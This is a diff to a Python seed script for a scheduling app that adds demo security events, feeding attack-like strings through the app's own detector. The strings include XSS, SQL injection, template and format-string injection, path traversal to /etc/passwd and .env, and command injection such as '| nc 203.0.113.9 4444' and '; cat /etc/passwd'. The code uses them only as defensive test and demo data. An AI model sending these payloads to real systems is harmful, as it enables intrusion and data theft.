@@ -44,11 +44,23 @@ assigns a shift to someone who has not set up their account.
 
 Reporting lines (Z2) come right after the company: REPORTING_LINES below, added through the
 same service the application uses, once per company.
+
+Security events (DT6) come last, so the security page has something to show before any
+real traffic exists: DEMO_ATTACKS below, over the last 30 days, by several people, of every
+attack type, plus one burst that the rate cap cuts short (a detection.summary row). Each
+attack is a value that the real detector is run on (app/detection), so its pattern and
+excerpt are exactly what the application would store; a demo value the detector does not
+flag stops the script. The events are then handed to the same writer the application uses
+(app/modules/security/writer.py), with its clock set to the demo moments, so they pass the
+same table rule (DE9) and rate cap (DE6). A few events from people not signed in, and one
+count of dropped copies (DE11), go to the platform table once. Added once: a company that
+already has security events is left alone.
 """
 
 from __future__ import annotations
 
 import sys
+import uuid
 from dataclasses import dataclass
 from datetime import UTC, date, datetime, time, timedelta
 from zoneinfo import ZoneInfo
@@ -64,11 +76,14 @@ from app.authz.models import ReportingLine
 from app.authz.roles import assign_role, create_starting_roles
 from app.core.config import get_settings
 from app.db.base import utcnow
+from app.detection.detector import inspect
 from app.modules.org.models import Company, Department, Team, TeamMember, User
 from app.modules.schedules import repository as shift_repository
 from app.modules.schedules.models import Shift
 from app.modules.schedules.schemas import ShiftCreate
 from app.modules.schedules.service import create_shift
+from app.modules.security.models import PlatformSecurityEvent, SecurityEvent
+from app.modules.security.writer import PER_MINUTE, Event, EventWriter
 from app.tenancy.context import set_company
 
 
@@ -263,6 +278,204 @@ WEEK_PATTERN = (
 
 # How many days of shifts each company gets, starting on the day the script runs.
 DEMO_DAYS = 14
+
+
+# --- Demo security events (DT6) -------------------------------------------------------
+
+
+@dataclass(frozen=True)
+class DemoAttack:
+    """One request with attack-like text, by one demo person, some days ago."""
+
+    person: int  # place in the company's list of people (as in REPORTING_LINES)
+    days_ago: int
+    hour: int  # UTC hour of that day, so the events spread over the day
+    method: str
+    route: str  # the route TEMPLATE, as the detection layer stores it
+    field: str
+    value: str  # what was sent; the detector decides its pattern and excerpt
+
+
+# Every attack type, by several people, spread over the last 30 days so the summary's two
+# windows (7 and 30 days) show different counts. The same in both companies, so a leak
+# between them stays obvious. The XSS value would run if the page showed it unsafely: the
+# demo shows that it appears as plain text instead (DE7).
+DEMO_ATTACKS = (
+    DemoAttack(
+        KITCHEN_A,
+        1,
+        15,
+        "PATCH",
+        "/api/shifts/{shift_id}",
+        "body.notes",
+        "<img src=x onerror=alert(1)>",
+    ),
+    DemoAttack(KITCHEN_B, 2, 10, "GET", "/api/teams", "query.department_id", "' OR 1=1 --"),
+    DemoAttack(FRONT_A, 3, 18, "POST", "/api/shifts", "body.notes", "{0.__class__}"),
+    DemoAttack(CREW_LEAD, 5, 9, "PATCH", "/api/shifts/{shift_id}", "body.notes", "$(whoami)"),
+    DemoAttack(KITCHEN_A, 6, 20, "GET", "/api/departments", "query.cursor", "../../etc/passwd"),
+    DemoAttack(
+        FRONT_A,
+        9,
+        13,
+        "GET",
+        "/api/teams",
+        "query.department_id",
+        "admin' UNION SELECT email FROM users --",
+    ),
+    DemoAttack(
+        KITCHEN_B, 12, 16, "POST", "/api/shifts", "body.notes", "<script>alert('hi')</script>"
+    ),
+    DemoAttack(
+        CREW_LEAD, 15, 11, "PATCH", "/api/shifts/{shift_id}", "body.notes", "| nc 203.0.113.9 4444"
+    ),
+    DemoAttack(FRONT_B, 20, 14, "POST", "/api/shifts", "body.notes", "%x.%x.%x.%x"),
+    DemoAttack(
+        KITCHEN_A, 25, 17, "GET", "/api/departments", "query.cursor", "..%2f..%2fapp%2f.env"
+    ),
+    DemoAttack(FRONT_B, 28, 12, "PATCH", "/api/shifts/{shift_id}", "body.notes", "{{7*7}}"),
+)
+# One burst: the same person sends BURST_SIZE attack values within one minute, 4 days ago.
+# The rate cap writes the first PER_MINUTE as rows and one detection.summary row for the
+# rest, exactly as it would for a real flood (DE6).
+BURST = DemoAttack(
+    FRONT_B, 4, 19, "PATCH", "/api/shifts/{shift_id}", "body.notes", "javascript:alert(1)"
+)
+BURST_SIZE = PER_MINUTE + 5
+# From people not signed in (platform_security_events: no company, no person, DE9), and
+# how many request copies a full queue dropped once (detection.dropped, DE11).
+PLATFORM_ATTACKS = (
+    (2, "GET", "/api/departments", "query.cursor", "' OR '1'='1"),
+    (8, "GET", "/api/teams", "query.department_id", "<svg onload=alert(1)>"),
+    (16, "GET", "/api/departments", "query.cursor", "; cat /etc/passwd"),
+)
+DEMO_DROPPED = (3, 37)  # 3 days ago, 37 copies dropped
+# Documentation addresses (RFC 5737): never a real sender.
+DEMO_ADDRESSES = ("203.0.113.10", "203.0.113.11", "198.51.100.20", "198.51.100.21")
+
+
+def _demo_events(
+    attack: DemoAttack,
+    at: datetime,
+    *,
+    company_id: uuid.UUID | None,
+    user_id: uuid.UUID | None,
+    source: str,
+    address: str,
+) -> list[Event]:
+    """The events the detector finds in one demo request (one per matching pattern)."""
+    findings = inspect([(attack.field, attack.value)])
+    if not findings:
+        raise SeedRefused(f"the detector does not flag the demo value {attack.value!r}")
+    return [
+        Event(
+            kind=f"detection.{finding.kind}",
+            source=source,
+            occurred_at=at,
+            pattern_id=finding.pattern_id,
+            field=finding.field,
+            method=attack.method,
+            route=attack.route,
+            client_address=address,
+            request_id=f"demo-{uuid.uuid4().hex[:12]}",
+            excerpt=finding.excerpt,
+            company_id=company_id,
+            user_id=user_id,
+        )
+        for finding in findings
+    ]
+
+
+def _moment(now: datetime, days_ago: int, hour: int) -> datetime:
+    """A demo moment in naive UTC (as stored): that many days ago, at that UTC hour."""
+    day = (now - timedelta(days=days_ago)).astimezone(UTC).replace(tzinfo=None)
+    return day.replace(hour=hour, minute=7, second=0, microsecond=0)
+
+
+def seed_security_events(engine: Engine, plan: CompanyPlan, now: datetime | None = None) -> int:
+    """Give a company its demo security events, unless it already has some. Returns how
+    many rows were added (events plus the burst's summary row): 0 if it had events.
+
+    Through the application's own writer (see the top of this file). Each writer writes a
+    company's rows in one transaction; the burst's summary row is written when that
+    writer is closed, in a second one. If that second one failed, the company would keep
+    its events without the summary; the next run would leave it alone (it has events), so
+    reset the database and seed again.
+    """
+    now = now or datetime.now(UTC)
+    with Session(engine) as platform:
+        company_id = platform.scalars(select(Company.id).where(Company.name == plan.name)).one()
+    with Session(engine) as session:
+        set_company(session, company_id)
+        # Counting a column of the model lets the company filter apply.
+        if session.scalar(select(func.count(SecurityEvent.company_id))):
+            return 0
+        people = {u.display_name: u.id for u in session.scalars(select(User))}
+
+    def person_id(index: int) -> uuid.UUID:
+        return people[plan.people[index].name]
+
+    # 1. The spread-out attacks. Each person is one source (their session), and none sends
+    #    more than PER_MINUTE here, so the cap writes every one as a row.
+    events: list[Event] = []
+    for number, attack in enumerate(DEMO_ATTACKS):
+        events += _demo_events(
+            attack,
+            _moment(now, attack.days_ago, attack.hour),
+            company_id=company_id,
+            user_id=person_id(attack.person),
+            source=f"session:demo-{attack.person}",
+            address=DEMO_ADDRESSES[number % 2],
+        )
+    spread = EventWriter(engine)
+    spread.write(events)
+    spread.close()
+
+    # 2. The burst, with the writer's clock at the burst's minute, so the cap counts it in
+    #    that minute and dates the summary row at its end, as it would have on the day.
+    burst_at = _moment(now, BURST.days_ago, BURST.hour)
+    burst: list[Event] = []
+    for _ in range(BURST_SIZE):
+        burst += _demo_events(
+            BURST,
+            burst_at,
+            company_id=company_id,
+            user_id=person_id(BURST.person),
+            source=f"session:demo-burst-{BURST.person}",
+            address=DEMO_ADDRESSES[0],
+        )
+    capped = EventWriter(engine, clock=lambda: burst_at)
+    capped.write(burst)
+    capped.close()  # writes the detection.summary row for the events held back
+
+    with Session(engine) as session:
+        set_company(session, company_id)
+        return int(session.scalar(select(func.count(SecurityEvent.company_id))) or 0)
+
+
+def seed_platform_events(engine: Engine, now: datetime | None = None) -> int:
+    """Add the demo events of people not signed in, and one drop count, unless the
+    platform table already has rows. Returns how many rows were added."""
+    now = now or datetime.now(UTC)
+    with Session(engine) as platform:
+        if platform.scalar(select(func.count(PlatformSecurityEvent.id))):
+            return 0
+    events: list[Event] = []
+    for number, (days_ago, method, route, field, value) in enumerate(PLATFORM_ATTACKS):
+        attack = DemoAttack(0, days_ago, 21, method, route, field, value)
+        address = DEMO_ADDRESSES[2 + number % 2]
+        events += _demo_events(
+            attack,
+            _moment(now, days_ago, 21),
+            company_id=None,
+            user_id=None,
+            source=f"address:{address}",
+            address=address,
+        )
+    EventWriter(engine).write(events)
+    days_ago, dropped = DEMO_DROPPED
+    EventWriter(engine, clock=lambda: _moment(now, days_ago, 22)).record_dropped(dropped)
+    return len(events) + 1
 
 
 def email_for(person: Person, domain: str) -> str:
@@ -629,7 +842,13 @@ def seed(
         # passwords, gets them on the next run.
         added = seed_shifts(engine, plan, now)
         shifts = "shifts wait for passwords" if added is None else f"{added} shifts added"
-        lines.append(f"{plan.name}: {state}; {reporting}; {passwords}; {shifts}")
+
+        # Security events need only the people, but come last: they are the least
+        # important part, and a demo database without them still works.
+        events = f"{seed_security_events(engine, plan, now)} security events added"
+        lines.append(f"{plan.name}: {state}; {reporting}; {passwords}; {shifts}; {events}")
+    # Events of people not signed in belong to no company: added once, for the platform.
+    lines.append(f"Platform: {seed_platform_events(engine, now)} security events added")
     return lines
 
 
